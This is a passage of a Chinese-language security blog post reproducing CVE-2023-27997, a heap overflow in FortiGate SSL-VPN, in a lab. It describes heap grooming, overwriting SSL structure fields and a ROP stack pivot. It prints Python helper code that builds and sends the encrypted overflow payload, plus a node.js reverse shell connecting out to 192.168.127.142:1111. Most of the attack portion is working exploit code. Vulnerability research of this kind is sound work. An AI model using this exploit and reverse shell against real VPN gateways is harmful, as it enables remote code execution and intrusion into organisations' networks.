<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(test_count):</span><br><span class="line">    sk = create_ssl_ctx()</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">b"enc="</span> + data</span><br><span class="line"></span><br><span class="line">    data = <span class="string">b"POST "</span> + path + <span class="string">b" HTTP/1.1\r\nHost: 192.168.127.133\r\nContent-Length: "</span> + \</span><br><span class="line">    <span class="built_in">str</span>(<span class="built_in">len</span>(payload)).encode() + \</span><br><span class="line">    <span class="string">b"\r\nUser-Agent: Mozilla/5.0\r\nContent-Type: text/plain;charset=UTF8\r\nAccept: */*\r\n\r\n"</span>+payload</span><br><span class="line"></span><br><span class="line">    sk.sendall(data)</span><br><span class="line">    socks.append(sk)</span><br></pre></td></tr></table></figure></div>

<p>下图是我申请出来的堆块地址分布，可以看到堆块连续程度并不是太好，但是在小范围内满足相邻堆块之间的地址差为0x1c00。</p>
<p><img lazyload="" src="/images/loading.svg" data-src="/images/Snipaste_2025-03-05_02-50-30.png" alt="nipaste_2025-03-05_02-50-3"></p>
<p>这里我采取的策略是释放掉倒数第二和倒数第三个 sock，然后发送一个 HTTP request 大小为 0x1c00的请求，之后就形成了如下堆布局：</p>
<p><img lazyload="" src="/images/loading.svg" data-src="/images/Snipaste_2025-03-05_02-59-09.png" alt="nipaste_2025-03-05_02-59-0"></p>
<p><img lazyload="" src="/images/loading.svg" data-src="/images/Snipaste_2025-03-05_03-07-17.png" alt="nipaste_2025-03-05_03-07-1"></p>
<p>对应内存中的表现就是</p>
<p><img lazyload="" src="/images/loading.svg" data-src="/images/Snipaste_2025-03-05_03-08-16.png" alt="nipaste_2025-03-05_03-08-1"></p>
<p>这时候我们的堆风水布局已经完成，后续之后通过 sock_n+1 重复发送HTTP请求（大小要与SSL结构体相同），依然会重复占用该堆块，因此我们就可以不断完成对 SSL_n 的重复溢出写。</p>
<blockquote>
<p><strong>这里有两个注意点：</strong></p>
<pre><code>1. 我在溢出的时候，依然下了内存调试断点，导致整个过程较慢，导致触发其他 sock 过期之类的操作，				  从而在溢出过程中提前失败，这是我后来才发现的
2. 另外一个是，我在溢出填充在SSL结构体中布置栈迁移的gadget的时候没有选择溢出 SSL_n 中的函数指针字段，而是选择覆盖了一些常量值的字段，这样就最大程度保证了，程序不会提前出发崩溃
</code></pre>
</blockquote>
<p>这里直接看最后的溢出效果即可：</p>
<p><img lazyload="" src="/images/loading.svg" data-src="/images/Snipaste_2025-03-05_03-17-46.png" alt="nipaste_2025-03-05_03-17-4"></p>
<p>这里我将 <code>handshake_func</code> 设置为了 <code>0xdeadbeef</code>，所以程序自然也就会停在这里了</p>
<p><img lazyload="" src="/images/loading.svg" data-src="/images/Snipaste_2025-03-05_03-19-10.png" alt="nipaste_2025-03-05_03-19-1"></p>
<p>之后我们在完成栈迁移到我们前面的 <code>HTTP_req</code> 中即可，这里面我们可以写很大的一块数据用来布置gadget，事实上这一部分才是真正浪费时间的部分，因为要在没有泄露堆地址的情况下，通过操作ROP来完成寄存器的设置。</p>
<p>最终调用等价如下C代码：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">execlp(<span class="string">"/bin/node"</span>, <span class="string">"node"</span>, <span class="string">"-e"</span>, </span><br><span class="line">       <span class="string">"net=require('net');"</span></span><br><span class="line">       <span class="string">"cp=require('child_process');"</span></span><br><span class="line">       <span class="string">"sh=cp.spawn('/bin/node',['-i']);"</span></span><br><span class="line">       <span class="string">"client=net.Socket();"</span></span><br><span class="line">       <span class="string">"client.connect(1111, '192.168.127.142', function() {"</span></span><br><span class="line">       <span class="string">"client.pipe(sh.stdin);"</span></span><br><span class="line">       <span class="string">"sh.stdout.pipe(client);"</span></span><br><span class="line">       <span class="string">"sh.stderr.pipe(client);"</span></span><br><span class="line">       <span class="string">"});"</span>,</span><br><span class="line">       (<span class="type">char</span> *)<span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure></div>

<p>最终效果如下：</p>
<p><img lazyload="" src="/images/loading.svg" data-src="/images/Snipaste_2025-03-05_03-27-52.png" alt="nipaste_2025-03-05_03-27-5"></p>
<p>我们也通过执行一段js脚本，成功输出了当前根目录下的所有文件夹，至此大功告成。</p>
<p><strong>dbg command</strong></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">watch_register_c 0x1553270 rax jemalloc_addr</span><br><span class="line">watch_register_c 0x155326b rdi jemalloc_size</span><br></pre></td></tr></table></figure></div>

<p><strong>gadget正则匹配</strong></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -E "pop\s+\w+\s;\spop\s+\w+\s;\spop\s+\w+\s;\spop\s+\w+\s;\spop\s+\w+\s;\spop\s+\w+\s;" gadget.txt</span><br></pre></td></tr></table></figure></div>





<h2 id="API"><a href="#API" class="headerlink" title="API"></a>API</h2><p>该漏洞再利用的过程中，有一个好的封装api写起利用会比较舒服（我也是用的别人写好的），下面的代码已罗列所有核心api调用</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> ssl</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_ssl_ctx</span>():</span><br><span class="line">    _socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    _default_context = ssl._create_unverified_context()</span><br><span class="line">    _default_context.options |= ssl.OP_NO_TLSv1_3</span><br><span class="line">    _socket = _default_context.wrap_socket(_socket)</span><br><span class="line">    _socket.connect((ip, port))</span><br><span class="line">    <span class="keyword">return</span> _socket</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_salt</span>(<span class="params">sk</span>):</span><br><span class="line">    sk.sendall(<span class="string">b"GET /remote/info "</span> \</span><br><span class="line">               + <span class="string">b"HTTP/1.1\r\nHost:"</span>+ip.encode()+<span class="string">b"\r\n\r\n"</span>)</span><br><span class="line">    data = sk.recv(<span class="number">1024</span>)</span><br><span class="line">    <span class="comment"># print(data)</span></span><br><span class="line">    <span class="comment"># sk.close()</span></span><br><span class="line">    salt = data[data.find(<span class="string">b"salt="</span>)+<span class="number">6</span>:data.find(<span class="string">b"salt="</span>)+<span class="number">14</span>]</span><br><span class="line">    info(<span class="string">"salt: "</span>+<span class="built_in">str</span>(salt))</span><br><span class="line">    <span class="keyword">return</span> salt</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_ks</span>(<span class="params">salt, seed, size</span>):</span><br><span class="line">    magic = <span class="string">b'GCC is the GNU Compiler Collection.'</span></span><br><span class="line">    k0 = md5(salt+seed+magic).digest()</span><br><span class="line">    keystream = k0</span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(keystream) &lt; size:</span><br><span class="line">        k0 = md5(k0).digest()</span><br><span class="line">        keystream += k0</span><br><span class="line">    <span class="keyword">return</span> keystream[:size]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_enc_data</span>(<span class="params">salt, seed, size, data</span>):</span><br><span class="line">    plaintext = p16(size) + data</span><br><span class="line">    keystream = gen_ks(salt, seed, <span class="built_in">len</span>(plaintext))</span><br><span class="line">    ciphertext = xor(plaintext, keystream).<span class="built_in">hex</span>()</span><br><span class="line">    <span class="keyword">return</span> seed + ciphertext.encode()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_seed_for_offset</span>(<span class="params">salt, offset, value</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0xffffff</span>):</span><br><span class="line">        seed = <span class="string">"00{0:06x}"</span>.<span class="built_in">format</span>(i).encode()</span><br><span class="line">        ks = gen_ks(salt, seed, offset+<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">int</span>(ks[offset]) == <span class="built_in">int</span>(value):</span><br><span class="line">            <span class="comment"># print("seed found: "+str(seed))</span></span><br><span class="line">            <span class="comment"># print("keystream: "+hex(ks[offset]))</span></span><br><span class="line">            <span class="comment"># print("value: "+str(value))</span></span><br><span class="line">            <span class="comment"># print("offset: "+str(offset))</span></span><br><span class="line">            <span class="keyword">return</span> seed</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"keystream not found"</span>)</span><br><span class="line">    exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_seeds_u8</span>(<span class="params">salt, offset, val</span>):</span><br><span class="line">    value = p8(val)</span><br><span class="line">    <span class="keyword">if</span> val == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> [(<span class="string">b'00bfbfbf'</span>, offset - <span class="number">1</span>), (<span class="string">b'00bfbfbf'</span>, offset - <span class="number">1</span>)]</span><br><span class="line">    s = gen_seed_for_offset(salt, offset, value[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">return</span> [(s, offset - <span class="number">2</span>), (s, offset - <span class="number">1</span>)]</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_payload</span>(<span class="params">_sk, salt, seed, size, data=<span class="string">b''</span></span>):</span><br><span class="line">    payload = <span class="string">b"enc="</span>+gen_enc_data(salt, seed, size, data)</span><br><span class="line">    rq = <span class="string">b"POST "</span> + path + <span class="string">b" HTTP/1.1\r\nHost: "</span>+ip.encode()+<span class="string">b"\r\nContent-Length: "</span> + \</span><br><span class="line">            <span class="built_in">str</span>(<span class="built_in">len</span>(payload)).encode() + \</span><br><span class="line">                <span class="string">b"\r\nUser-Agent: Mozilla/5.0\r\nContent-Type: application/x-wwwform-urlencoded\r\nConnection: keep-alive\r\nAccept: */*\r\n\r\n"</span>+payload</span><br><span class="line">    _sk.sendall(rq)</span><br><span class="line">    <span class="comment"># _sk.recv(1024)</span></span><br></pre></td></tr></table></figure></div>



<h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><p><a class="link" target="_blank" rel="noopener" href="https://blog.lexfo.fr/xortigate-cve-2023-27997.html">https://blog.lexfo.fr/xortigate-cve-2023-27997.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link" target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/8yGthffBlJLXG0ysE_ZRgw">https://mp.weixin.qq.com/s/8yGthffBlJLXG0ysE_ZRgw <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link" target="_blank" rel="noopener" href="https://github.com/BishopFox/CVE-2023-27997-check">https://github.com/BishopFox/CVE-2023-27997-check <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link" target="_blank" rel="noopener" href="https://bishopfox.com/blog/cve-2023-27997-vulnerability-scanner-fortigate">https://bishopfox.com/blog/cve-2023-27997-vulnerability-scanner-fortigate <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link" target="_blank" rel="noopener" href="https://bestwing.me/CVE-2023-27997-FortiGate-SSLVPN-Heap-Overflow.html">https://bestwing.me/CVE-2023-27997-FortiGate-SSLVPN-Heap-Overflow.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><p>关虚拟机的时候记得点击<code>关闭客户机</code>而不是直接点关机（关闭电源，有可能会损坏文件系统）。</p>

        </div>

        
            <div class="post-copyright-info my-8 px-2 sm:px-6 md:px-8">
                <div class="article-copyright-info-container">
    <ul>
        <li><strong>Title:</strong> Fortigate SSLVPN-CVE-2023-27997</li>
        <li><strong>Author:</strong> henry</li>
        <li><strong>Created at
                :</strong> 2025-03-05 14:49:15</li>
        
            <li>
                <strong>Updated at
                    :</strong> 2025-03-05 14:59:11
            </li>
        
        <li>
            <strong>Link:</strong> https://henrymartin262.github.io/2025/03/05/SSLVPN-CVE-2023-27997/
        </li>
        <li>
            <strong>
                License:
            </strong>
            

            
                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
            
        </li>
    </ul>
</div>

            </div>
        

        
            <ul class="post-tags-box">
                
                    <li class="tag-item">
                        <a href="/tags/iot/">#iot</a>&nbsp;
                    </li>
                
                    <li class="tag-item">
                        <a href="/tags/fortigate/">#fortigate</a>&nbsp;
                    </li>
                
            </ul>
        

        

        
            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
                
                    <div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
                        <a class="prev"
                        rel="prev"
                        href="/2025/05/19/CVE-2025-0282/"
                        >
                            <span class="left arrow-icon flex justify-center items-center">
                                <i class="fa-solid fa-chevron-left"></i>
                            </span>
                            <span class="title flex justify-center items-center">
                                <span class="post-nav-title-item">CVE-2025-0282 复现与分析</span>
                                <span class="post-nav-item">Prev posts</span>
                            </span>
                        </a>
                    </div>
                
                
                    <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
                        <a class="next"
                        rel="next"
                        href="/2025/02/10/KSMA/"
                        >
                            <span class="title flex justify-center items-center">
                                <span class="post-nav-title-item">KSMA - Kernel Space Mirroring Attack</span>
                                <span class="post-nav-item">Next posts</span>
                            </span>
                            <span class="right arrow-icon flex justify-center items-center">
                                <i class="fa-solid fa-chevron-right"></i>
                            </span>
                        </a>
                    </div>
                
            </div>
        


        
            <div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
                <div class="comments-container pjax">
    <div id="comment-anchor"></div>
    <div class="comment-area-title">
        <i class="fa-solid fa-comments"></i>&nbsp;Comments
    </div>
    

        
            
    <div id="waline"></div>
    <script type="module" data-swup-reload-script>
      import { init } from '/js/libs/waline.mjs';

      function loadWaline() {
        init({
          el: '#waline',
          serverURL: 'https://example.example.com',
          lang: 'zh-CN',
          dark: 'body[class~="dark-mode"]',
          requiredMeta: ['nick', 'mail']
        });
      }

      if (typeof swup !== 'undefined') {
        loadWaline();
      } else {
        window.addEventListener('DOMContentLoaded', loadWaline);
      }
    </script>



        
    
</div>

            </div>
        
    </div>

    
        <div class="toc-content-container">
            <div class="post-toc-wrap">
    <div class="post-toc">
        <div class="toc-title">On this page</div>
        <div class="page-title">Fortigate SSLVPN-CVE-2023-27997</div>
        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Debug-exploit"><span class="nav-text">Debug &amp; exploit</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Detect-vuln"><span class="nav-text">Detect vuln</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Debug-vuln"><span class="nav-text">Debug vuln</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#DBG"><span class="nav-text">DBG</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Exploit"><span class="nav-text">Exploit</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#API"><span class="nav-text">API</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#reference"><span class="nav-text">reference</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9"><span class="nav-text">注意事项</span></a></li></ol>

    </div>
</div>
        </div>
    
</div>



                

            </div>

            

        </div>

        <div class="main-content-footer">
            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
    <div class="info-container py-3 text-center">
        
        <div class="text-center">
            &copy;
            
              <span>2023</span>
              -
            
            2025&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">henry</a>
        </div>
        
            <script data-swup-reload-script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
                
                    <span id="busuanzi_container_site_uv" class="lg:!block">
                        <span class="text-sm">VISITOR COUNT</span>
                        <span id="busuanzi_value_site_uv"></span>
                    </span>
                
                
                    <span id="busuanzi_container_site_pv" class="lg:!block">
                        <span class="text-sm">TOTAL PAGE VIEWS</span>
                        <span id="busuanzi_value_site_pv"></span>
                    </span>
                
            </div>
        
        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.5.6</a></span>
        </div>
        
        
            <div>
                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
            </div>
        
        
            <script data-swup-reload-script>
                try {
                    function odometer_init() {
                    const elements = document.querySelectorAll('.odometer');
                    elements.forEach(el => {
                        new Odometer({
                            el,
                            format: '( ddd).dd',
                            duration: 200
                        });
                    });
                    }
                    odometer_init();
                } catch (error) {}
            </script>
        
        
        
    </div>  
</footer>
        </div>
    </div>

    
        <div class="post-tools">
            <div class="post-tools-container">
    <ul class="article-tools-list">
        <!-- TOC aside toggle -->
        
            <li class="right-bottom-tools page-aside-toggle">
                <i class="fa-regular fa-outdent"></i>
            </li>
        

        <!-- go comment -->
        
            <li class="go-comment">
                <i class="fa-regular fa-comments"></i>
            </li>
        
    </ul>
</div>

        </div>
    

    <div class="right-side-tools-container">
        <div class="side-tools-container">
    <ul class="hidden-tools-list">
        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
            <i class="fa-regular fa-magnifying-glass-plus"></i>
        </li>

        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
            <i class="fa-regular fa-magnifying-glass-minus"></i>
        </li>

        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
            <i class="fa-regular fa-moon"></i>
        </li>

        <!-- rss -->
        

        

        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
            <i class="fa-regular fa-arrow-down"></i>
        </li>
    </ul>

    <ul class="visible-tools-list">
        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
            <i class="fa-regular fa-cog fa-spin"></i>
        </li>
        
            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
                <i class="arrow-up fas fa-arrow-up"></i>
                <span class="percent"></span>
            </li>
        
        
    </ul>
</div>

    </div>

    <div class="image-viewer-container">
    <img src="">
</div>


    

</main>


    
<script src="/js/libs/Swup.min.js"></script>

<script src="/js/libs/SwupSlideTheme.min.js"></script>

<script src="/js/libs/SwupScriptsPlugin.min.js"></script>

<script src="/js/libs/SwupProgressPlugin.min.js"></script>

<script src="/js/libs/SwupScrollPlugin.min.js"></script>

<script src="/js/libs/SwupPreloadPlugin.min.js"></script>

<script>
    const swup = new Swup({
        plugins: [
            new SwupScriptsPlugin({
                optin: true,
            }),
            new SwupProgressPlugin(),
            new SwupScrollPlugin({
                offset: 80,
            }),
            new SwupSlideTheme({
                mainElement: ".main-content-body",
            }),
            new SwupPreloadPlugin(),
        ],
        containers: ["#swup"],
    });
</script>







<script src="/js/tools/imageViewer.js" type="module"></script>

<script src="/js/utils.js" type="module"></script>

<script src="/js/main.js" type="module"></script>

<script src="/js/layouts/navbarShrink.js" type="module"></script>

<script src="/js/tools/scrollTopBottom.js" type="module"></script>

<script src="/js/tools/lightDarkSwitch.js" type="module"></script>

<script src="/js/layouts/categoryList.js" type="module"></script>





    
<script src="/js/tools/codeBlock.js" type="module"></script>




    
<script src="/js/layouts/lazyload.js" type="module"></script>




    
<script src="/js/tools/runtime.js"></script>

    
<script src="/js/libs/odometer.min.js"></script>

    
<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">




  
<script src="/js/libs/Typed.min.js"></script>

  
<script src="/js/plugins/typed.js" type="module"></script>







<div class="post-scripts" data-swup-reload-script>
    
        
<script src="/js/libs/anime.min.js"></script>

        
<script src="/js/tools/tocToggle.js" type="module"></script>

<script src="/js/layouts/toc.js" type="module"></script>

<script src="/js/plugins/tabs.js" type="module"></script>

    
</div>


    <div id="aplayer"></div>

<script src="/js/libs/APlayer.min.js"></script>


<script src="/js/plugins/aplayer.js"></script>


</body>
</html>
